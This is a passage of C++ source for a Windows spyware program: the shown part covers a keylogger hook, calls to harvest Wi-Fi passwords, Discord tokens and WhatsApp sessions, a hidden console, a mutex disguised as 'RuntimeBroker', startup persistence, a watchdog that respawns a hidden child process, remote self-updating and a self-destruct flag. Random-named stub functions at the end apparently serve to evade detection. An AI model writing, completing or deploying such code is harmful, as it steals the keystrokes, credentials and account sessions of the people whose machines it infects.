    g_hHook = SetWindowsHookExW(WH_KEYBOARD_LL, KeyboardProc, hInstance, 0);
    if (!g_hHook) {
        LogMsg("Hook failed: " + std::to_string(GetLastError()));
        return 1;
    }

    LogMsg("Child started on " + g_hostname);

    HarvestWiFiPasswords();
    HarvestDiscordTokens();
    HarvestWhatsAppSession();

    MSG msg;
    while (g_running && GetMessage(&msg, NULL, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    if (g_hHook) UnhookWindowsHookEx(g_hHook);
    if (g_hwnd) DestroyWindow(g_hwnd);
    Gdiplus::GdiplusShutdown(gdiToken);
    LogMsg("Child stopped");
    return 0;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR lpCmdLine, int) {
    AddVectoredExceptionHandler(1, VectoredHandler);
    InitConfig();
    HWND consoleWnd = GetConsoleWindow();
    if (consoleWnd) ShowWindow(consoleWnd, SW_HIDE);

    std::string cmdLine(lpCmdLine ? lpCmdLine : "");
    if (cmdLine.find("--child") != std::string::npos) {
        return RunChild(hInstance);
    }

    CreateMutexW(NULL, TRUE, L"RuntimeBroker_Instance");
    if (GetLastError() == ERROR_ALREADY_EXISTS) return 0;

    char hostname[256] = {0};
    DWORD hostnameSize = sizeof(hostname);
    GetComputerNameA(hostname, &hostnameSize);
    g_hostname = hostname;

    InstallStartup();
    LogMsg("Watchdog started on " + g_hostname);

    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    std::string exePath(path);

    int crashCount = 0;
    DWORD lastCrashTime = 0;

    while (true) {
        RemoveKillFlag();

        // Check for updates before spawning child (works even in crash loops)
        { int rv = GetRemoteVersion(); if (rv > NETPEN_VERSION) { bool upd = DeployUpdate(rv); if (upd) break; } }

        STARTUPINFOA si = {0};
        si.cb = sizeof(si);
        PROCESS_INFORMATION pi = {0};
        std::string childCmd = "\"" + exePath + "\" --child";

        if (!CreateProcessA(exePath.c_str(), &childCmd[0], NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            Sleep(30000);
            continue;
        }

        bool updated = false;
        while (true) {
            DWORD wr = WaitForSingleObject(pi.hProcess, 300000);
            if (wr == WAIT_TIMEOUT) {
                int rv = GetRemoteVersion();
                if (rv > NETPEN_VERSION) {
                    TerminateProcess(pi.hProcess, 1);
                    updated = DeployUpdate(rv);
                    break;
                }
                if (KillFlagExists()) {
                    TerminateProcess(pi.hProcess, 1);
                    break;
                }
            } else {
                break;
            }
        }

        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        if (KillFlagExists()) {
            RemoveKillFlag();
            LogMsg("Self-destruct triggered, watchdog exiting");
            break;
        }

        if (updated) {
            LogMsg("Watchdog exiting for update");
            break;
        }

        // Crash-loop backoff
        DWORD now = GetTickCount();
        if (now - lastCrashTime < 10000) {
            crashCount++;
            if (crashCount > 5) {
                DWORD delay = std::min(600000u, 3000u * (1u << std::min((unsigned)(crashCount - 5), 8u)));
                LogMsg("Crash loop detected (" + std::to_string(crashCount) + "), backing off " + std::to_string(delay/1000) + "s");
                Sleep(delay);
            }
        } else {
            crashCount = 0;
        }
        lastCrashTime = now;

        Sleep(3000);
    }

    return 0;
}









int _s2c82aaaa886e49b28794499e1fb8d69c(void){return 0;}
int _sd7f9bd008da14598892b2482d9609e20(void){return 0;}
int _s648d5539b27140ebb936cd13c8ed671a(void){return 0;}
